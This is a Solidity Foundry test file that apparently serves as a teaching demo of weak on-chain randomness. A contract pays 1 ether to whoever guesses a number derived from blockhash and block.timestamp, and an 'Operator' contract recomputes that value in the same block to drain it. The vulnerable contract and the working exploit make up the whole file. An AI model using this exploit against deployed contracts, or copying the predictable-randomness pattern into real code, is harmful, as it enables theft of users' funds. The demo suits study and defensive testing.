// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    GuessTheRandomNumber GuessTheRandomNumberContract;
    Operator OperatorContract;

    function testRandomness() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.prank(alice);

        GuessTheRandomNumberContract = new GuessTheRandomNumber{
            value: 1 ether
        }();
        vm.startPrank(eve);
        OperatorContract = new Operator();
        console.log(
            "Before operation",
            address(OperatorContract).balance
        );
        OperatorContract.operate(GuessTheRandomNumberContract);
        console.log(
            "Eve wins 1 Eth, Balance of OperatorContract:",
            address(OperatorContract).balance
        );
        console.log("operate completed");
    }

    receive() external payable {}
}

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Operator {
    receive() external payable {}

    function operate(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}